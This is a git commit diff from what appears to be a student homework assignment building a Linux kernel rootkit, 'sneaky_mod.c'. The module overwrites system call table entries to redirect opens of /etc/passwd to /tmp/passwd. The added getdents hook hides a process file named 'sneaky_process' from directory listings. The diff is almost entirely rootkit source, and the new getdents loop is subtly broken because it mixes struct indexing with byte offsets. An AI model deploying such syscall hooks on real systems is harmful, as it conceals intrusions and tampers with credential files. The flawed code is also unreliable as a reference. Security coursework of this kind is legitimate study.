c7d2dd26755e900292b12d4eb559f07887f7ce0e
bh214 <bh214@duke.edu>
2020-04-10 22:51:04 -0400

    (s-m): working on dirent getdents

--- homework5-kit/sneaky_mod.c
+++ homework5-kit/sneaky_mod.c
@@ -12,10 +12,10 @@
 
 // ?? to make sure that the “struct linux_dirent” is interpreted correctly ??
 struct linux_dirent {
-  u64            d_ino;
-  s64            d_off;
-  unsigned short d_reclen;
-  char           d_name[];
+  u64            d_ino;     // inode number
+  s64            d_off;     // offset to next linux_dirent
+  unsigned short d_reclen;  // linux_dirent length
+  char           d_name[];  // null-terminated filename
 }; 
 
 
@@ -45,11 +45,12 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //////////////////////////////
 
 // function ptr to original systen call "open" (token: __NR_open)
-asmlinkage int (*sys_open)(const char *pathname, int flags);
+asmlinkage int (*sys_open) (const char *pathname, int flags);
 
 // Define new "open"
-asmlinkage int sneaky_open(const char *pathname, int flags)
+asmlinkage int sneaky_open (const char *pathname, int flags)
 {
+  // if wants to call "open" on "/etc/passwd": substitue for "/tmp/passwd" instead!
   if (strcmp(pathname, "/etc/passwd") == 0) {
     copy_to_user((void *)pathname, "/tmp/passwd", 12); 
     // 12 = "/tmp/passwd"(11) + "\0"(1)
@@ -59,9 +60,50 @@ asmlinkage int sneaky_open(const char *pathname, int flags)
 }
 
 
-/////////////////////
-///  
-/////////////////////
+////////////////////////////
+///  "getdents" system call
+////////////////////////////
+
+// function ptr for original call
+asmlinkage int (*sys_getdents) (unsigned int fd,
+				struct linux_dirent *dirp,
+				unsigned int count);
+
+// define new sneaky function
+asmlinkage int sneaky_getdents (unsigned int fd,
+				struct linux_dirent *dirp,
+				unsigned int count) {
+  // first call original getdents() to get all dirent structs
+  int dirent_size = sys_getdents(fd, dirp, count);
+  int examined_size = 0;
+  int skipped_size = 0;
+
+  // iterate through "dirp ",
+  // skip: any dirent with filename == "sneaky_process"
+  // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent 
+  for (int i = 0; i < (dirent_size - skipped_size);) {
+    if (strcmp(dirp[i]->d_name, "sneaky_process") == 0) {
+      skipped_size += (int)(dirp[i]->d_reclen);
+      
+      void* unexamined_start = (void*)(dirp[i]) + dirp[i]->d_reclen;
+      int unexamined_size = dirent_size - examined_size - skipped_size;
+      memmove((void*)(dirp[i]),
+	      unexamined_start,
+	      unexamined_size);
+      // i stays the same here, do not update!
+      
+    } else {
+      examined_size += (int)(dirp[i]->d_reclen);
+
+      // update i here
+      i +=  (int)(dirp[i]->d_reclen);
+    }
+  }
+  
+  return dirent_size - skipped_size;
+}
+
+
 
 ////////////////////////////////
 ///  module load/unload routine
